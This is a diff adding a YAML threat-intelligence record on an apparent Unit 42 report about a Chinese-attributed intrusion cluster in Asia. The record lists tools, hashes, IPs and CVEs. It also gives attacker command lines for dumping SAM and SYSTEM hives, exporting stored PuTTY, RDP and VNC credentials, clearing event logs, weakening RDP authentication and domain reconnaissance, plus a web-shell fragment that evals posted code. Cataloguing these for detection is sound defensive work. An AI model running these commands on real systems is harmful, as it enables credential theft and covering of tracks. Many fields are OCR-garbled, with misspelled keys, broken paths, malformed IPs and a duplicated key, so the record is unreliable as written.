@@ -1,0 +1,217 @@
+description: Cluster of activity targeting high-value organizations in Asia using
+  a variety of tools and techniques including web shells, DLL side-loading, and custom
+  scanners.
+attribution: Chinese threat actor
+malware_families:
+- GodZilla
+- AntSword
+- Xnote
+- FRP
+- ScanPortPlus
+- SuperDump
+- PrintProgram
+- Sliver Shell Implant
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - python.exe
+  - pythonw.exe
+  - mimikatz
+  - LsaRecorder
+  - DumpIt
+  - Volatility
+  - ssms.exe
+  - rar.exe
+  - sqlstudio.bin
+  - vc.exe
+  - srunas.exe
+  - sqlservr.exe
+  - Is.exe
+  - LsaRecorder.exe
+  - ScanPortPlus
+  - FRP
+  - CVE.exe
+  commandline:
+  - certutil -encode
+  - type
+  - WinRAR a -df host.rar *.txt
+  - WinRAR a -df host.rar *.txt *.db
+  - WinRAR a -df host.rar *.txt *.db *hist* *book*
+  - wmic LOGICALDISK
+  - wevtutil qe security /format:text /q:"Event[System[(EventID=4624)]]"
+  - WMIC patd win32_process get Caption,Processid,Commandline
+  - quser net user net localgroup administrators ipconfig /all netstat -ano tasklist /v ipconfig /displaydns systeminfo C:\\Windows\\system32\\inetsrv\\appcmd.exe
+    list site C:\\Windows\\system32\\inetsrv\\AppCmd.exe LIST vdir C:\\Windows\\system32\\inetsrv\\appcmd.exe
+    list apppool C:\\Windows\\system32\\inetsrv\\appcmd.exe list app C:\\Windows\\system32\\inetsrv\\appcmd.exe
+    list Modules route print arp -a
+  - 'wmic LOGICALDISK get name,Description,filesystem,size,freespace wmic LOGICALDISK
+    get name |findstr :'
+  - C:\\Windows\\system32\\cmd.exe /c dir c:\\users\\ /b
+  - wmic process get name,executablepatd,processid
+  - reg query HKEY_USERS
+  - reg query "HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Uninstall" /s /v Display*
+  - reg export "HKEY_USERS\\[%SID%]\\SOFTWARE\\SimonTatdam\\PuTTY\\SshHostKeys"
+  - reg export "HKEY_USERS\\[%SID%]\\Software\\Microsoft\\Terminal Server Client"
+  - reg export "HKEY_USERS\\[%SID%]\\Software\\RealVNC"
+  - reg export "HKEY_USERS\\[%SID%]\\SOFTWARE\\TightVNC\\Server" reg export HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\TightVNC\\Server
+    reg export HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server
+  - wevtutil cl Security wevtutil cl system wevtutil cl application wevtutil cl setup
+    wevtutil cl "windows powershell"
+  - net user:$USER$ net group /domain "net group ""domain admins"" /domain " "net
+    group ""enterprise admins"" /domain " net localgroup administrators /domain "net
+    group ""domain controllers"" /domain " "net group ""domain computers"" /domain
+    "
+  - reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP"
+    /v UserAutdentication /t REG_DWORD /d [REDACTED_VALUE] /f
+  - reg save HKLM\\SYSTEM sys.hiv and reg save HKLM\\SAM sam.hiv
+  - rar.exe a -df host.rar *.txt
+  - sqlservr.exe cmd.exe python.exe -t 1 -i 192.168.14.1/24 -l 14.p 8043 -p 445 -p
+    135 -p 443 -p 3389
+  - 'ScanPortPlus [-h|help] [-i|ip "<value>" [-i|ip "<value>" ...1]1[-plport "<value>"
+    [-p|port "<value>" ...11 [-s|ForcessL port <integer>] [t|thread <integer>] [-0|timeout<integer>]
+    [-1|logfile "<value>"] [-j|jsonlogfile  jsonlogfile. Default: out.jsonw webaddr
+    web listen addr example: 127.8.8.1:8888-v scanvuln scanvuln. Default: false'
+  - CVE.exe [-h] -t TARGET [-c COMMAND]
+  - Is.exe -r c:wsers\\publicideskiop.ini
+  powershell:
+  - function Page_Load(){var a=Request.Form["code"]; var b="unsa",c="fe",d=btc;Function
+    fun() { retwrn a; Jeval(fun(),d); J*/scriptTMs > c:\\Ninetpub\\\\mmroot\\\\aspnet_client\\aspret.aspxs
+  scripting_engine:
+  - Batch scripts (a.bat, hp.bat, hpp.bat)
+  - SuperDump
+  - JScript
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Navicat
+  - HKEY_CURRENT_USER\\Software\\WinSCP
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer
+  - HKEY_CURRENT_USER\\Environment
+  - HKEY_CURRENT_USER\\Software\\PuTTY
+  - HKEY_CURRENT_USER\\Software\\FileZilla
+  - HKEY_CURRENT_USER\\Software\\NetSarang
+  - HKEY_CURRENT_USER\\SSH
+  - HKEY_USERS
+  - HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Uninstall
+  - HKEY_USERS\\[%SID%]\\SOFTWARE\\SimonTatdam\\PuTTY\\SshHostKeys
+  - HKEY_USERS\\[%SID%]\\Software\\Microsoft\\Terminal Server Client
+  - HKEY_USERS\\[%SID%]\\Software\\RealVNC
+  - HKEY_USERS\\[%SID%]\\SOFTWARE\\TightVNC\\Server
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP
+  image_load:
+  - python20.dll
+  - cnd.exe
+  - spoolsv.exe
+  - lsass.exe
+  network_connections:
+  - sqlservr.exe cmd.exe python.exe -t 1 -i 192.168.14.1/24 -l 14.p 8043 -p 445 -p
+    135 -p 443 -p 3389
+  - 'ScanPortPlus [-h|help] [-i|ip "<value>" [-i|ip "<value>" ...1]1[-plport "<value>"
+    [-p|port "<value>" ...11 [-s|ForcessL port <integer>] [t|thread <integer>] [-0|timeout<integer>]
+    [-1|logfile "<value>"] [-j|jsonlogfile  jsonlogfile. Default: out.jsonw webaddr
+    web listen addr example: 127.8.8.1:8888-v scanvuln scanvuln. Default: false'
+  - CVE.exe [-h] -t TARGET [-c COMMAND]
+  - Is.exe -r c:wsers\\publicideskiop.ini
+  file_activity:
+  - c:\\inetpub\\wwwroot\\web.config
+  - c:\\inetpub\\wwwroot\\.aspx
+  - c:\\inetpub\\wwwroot\\.asmx
+  - c:\\inetpub\\wwwroot\\.asax
+  - c:\\inetpub\\wwwroot\\.dll
+  - appsettings.json
+  - host.txt
+  - sec.txt
+  - pro.txt
+  - disk.txt
+  - dir.txt
+  - list.txt
+  - sid.txt
+  - install.txt
+  - '[%SID%].putty.txt'
+  - '[%SID%].txt'
+  - '[%SID%].RealVNC.txt'
+  - '[%SID%].TightVNC.txt'
+  - vnc1.txt
+  - vnc2.txt
+  - sys.hiv
+  - sam.hiv
+  - host.rar
+  - web.txt
+  - web.rar
+  - sqlstudio.bin
+  - mempta.txt
+  - sqlStudio.bin
+  - win.dmp
+  - windows.hashdump
+  - aspnet_client\\aspret.aspx
+  persistence:
+  - Clear Logs cl.bat
+  - Query Domain dom.bat
+  - Weaken RDP Security 3389.bat
+  - Dumping SAM and SYS Files sam.bat/sam1.bat
+  - DumpIt and Volatility dmp.bat and vo.bat
+  - File Archiving rar.bat/rr.bat
+  process_relations:
+  - python.exe->python20.dll
+  - sqlservr.exe cmd.exe python.exe -t 1 -i 192.168.14.1/24 -l 14.p 8043 -p 445 -p
+    135 -p 443 -p 3389
+  - Is.exe -r c:wsers\\publicideskiop.ini
+IOCs:
+  hashes:
+  - 524734501be19e9ed1bfab304b0622a2263a4f9e3db0971f3fae93f7e7369c20
+  - 26483f0886078cc9f5f9912d3ffce1301e297b435920ab1c86c9107bbdce4db2
+  - 99bd09e1c500866b2b809fd9170f1b8b7e120da21a1f2eed6165fcf81bf519b7
+  - 8a3345f0d8f1a7d78ea485ae11358cf2ae3d51cb7975524d6d67ba05a08a37ea
+  - 6ddbfd3a96834087501f0c9415a925cafdb92cb8ff34685f138833b4795416d6
+  - 3b2b6a3ee023dfa168f257b292a28f5fbdbacb5aa2250e1efb36e650529db1b5
+  - cfdcbc553bc7464aedfb6758b0a38acc78d9537eabe9717e60ab0d8d3b355225
+  - d8378cf105146217e6ded438187c4ea0edcadb6cf27f5eeddda3fd80cce76d72
+  - 5c986203242e2ed25458b0606ee7be57070f6d66b7472b453d92b1b6786443bd
+  - cfcbb3014ecc560ba36103213b36fc62d6b0ef22c49067ff0d860fd7253a7c94
+  - fb9400d763a009b3bd2b9468410e0c69ee8a4f58400e532f086cef749422210d
+  - c880936ba0ca153719c2cca33c1925a9480d28abc88cf4daa02f34cc8cc1c9e5
+  - d6ed94589b0e6a7c3e1a6052e18f3962ca78c385c78036972d5ea72c07a5772c
+  - 3e698c85660e2c012b3db7f47ca3f2b1af2b6b0e0a0d2bdb7903f91cf9d317320d03934eb181c2befbc5341208c4eb8f939e00382ac632216397b8210225c937
+  - 8d3907d56b1dd1609053cb55dd66f33499e1ea091133df76d8fe6f08f25f37b2
+  - 082a55731f972cd15e103104229a68175a8c59a52bae05daa8ed4302df7c2dec
+  - e1ff808321ce952384b7fff720584c48ec0fd36480d6bc9ac0d5db036102c368
+  - cdb90179188a142d24147edcb72be8b574fac4f6833fff15a6ee803754dec0c0
+  - f6ac9e5e76bc9daf4772c5be43c9eac1d2611caafd49fac70bbb8eebfa4781ac
+  - 96f52e4666aa8df67f8d7d00a523cd25e11402108157156775603b3d9514925c
+  - e9541e8afa502e13c18734756270b10e3c07f1071283387e63c8f8b0ba591343
+  - f7c73b1ac9aff545b184ec7121f2bc706c5064dc3c17f59e9a39469031bf2ef6
+  - b87cee18720c176c1972cf5c74e3c09877177e0c49c34a04b910bb3c70839b71
+  - f710dc61c2edc85841fd733a17b7977dfb889d6476c59bb3c54a5b2fd393ac13
+  - edc0287da3c6bb62a7b2fd3949be5688628fc0e893b5822bd5734a63c39f7ab1
+  - 0c7db12ec29f333bf5f53dc5c73ec446b2265fca3aad5144c3569409e15123cb
+  - 8af434c2af2d901694cb27ec8639e7054f84938110a5cc4492c1bac597026d50
+  - ce20c033dcadf17d9cca325869f946efdd82ab0756fa56e262b6f573252d457c
+  - 52c817465a56ccd0fb4e914a3274a9e9a93e872583e6239bc6461e4f3e40c567
+  ip_addresses:
+  - 13.250.108.65
+  - 43.255.189.67
+  - 52.77.253.4
+  - 79.141.169.123
+  - 107.148.33.60
+  - 107.148.51.251
+  - 107.148.130.22
+  - 127.8.8.1
+  - 10.10.1.8/24
+  - 192.168.71.200-254
+  - 192.168.70.200-192.168.71.254
+  - 127.8.8.1:8888
+  - 127.9.0.3% g rRe-subS+
+  - 52,77.253.4:443
+  domains: []
+  urls:
+  - http://79.141.169.123
+authors:
+- Unit 42
+CVEs:
+- CVE-2021-4034
+- CVE-2023-34048
+authors:
+- Tom Fakterman
+reference: https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/
+date_of_publication: March 03, 2026
+file_creation_date: March 08, 2026
